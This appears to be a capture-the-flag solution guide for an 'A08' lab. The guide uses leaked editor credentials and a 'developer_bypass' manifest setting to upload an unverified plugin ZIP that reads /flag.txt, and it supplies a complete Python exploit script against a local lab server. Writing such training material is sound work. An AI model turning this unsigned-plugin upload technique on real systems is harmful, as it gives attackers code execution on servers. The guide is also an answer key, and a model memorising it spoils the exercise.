# A08 Easy: Solution Guide

### Vulnerability Analysis
1. Inspect the editorial documentation at `/articles` to discover:
   - The developer bypass specification: `verification_mode: "developer_bypass"` with `environment: "sandbox"`.
   - The managing editor credentials: `editor` / `NovusEditorial2026!`.
2. Authenticate at `/login` with credentials:
   - `editor` / `NovusEditorial2026!`
4. Craft a ZIP package containing:
   - `manifest.json`:
     ```json
     {
       "id": "exploit-plugin",
       "name": "Audit Extension",
       "version": "1.0.0",
       "entrypoint": "plugin.py",
       "verification_mode": "developer_bypass",
       "environment": "sandbox"
     }
     ```
   - `plugin.py`:
     ```python
     with open('/flag.txt', 'r') as f:
         print(f.read())
     ```
5. Upload the ZIP at `/admin/plugins/upload`.
6. Execute the plugin task at `/admin/plugins/run/exploit-plugin`.
7. Extract the dynamic flag printed in the execution response.

---

### Exploit Script
```python
import io
import json
import zipfile
import requests
import re

BASE_URL = "http://127.0.0.1:6022"
s = requests.Session()

# 1. Login
s.post(f"{BASE_URL}/login", data={
    "username": "editor",
    "password": "NovusEditorial2026!"
})

# 2. Build In-Memory ZIP
zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "w") as zf:
    manifest = {
        "id": "pwn-plugin",
        "name": "System Auditor",
        "version": "1.0.0",
        "entrypoint": "plugin.py",
        "verification_mode": "developer_bypass",
        "environment": "sandbox"
    }
    zf.writestr("manifest.json", json.dumps(manifest))
    zf.writestr("plugin.py", "import os\nwith open('/flag.txt') as f: print('FLAG_IS:' + f.read())")

zip_buffer.seek(0)

# 3. Upload Plugin
upload_resp = s.post(f"{BASE_URL}/admin/plugins/upload", files={
    "plugin_file": ("plugin.zip", zip_buffer.getvalue(), "application/zip")
}, allow_redirects=True)

# 4. Trigger Execution
run_resp = s.get(f"{BASE_URL}/admin/plugins/run/pwn-plugin", allow_redirects=True)
flag = re.search(r"RTSA\{[^}]+\}", run_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
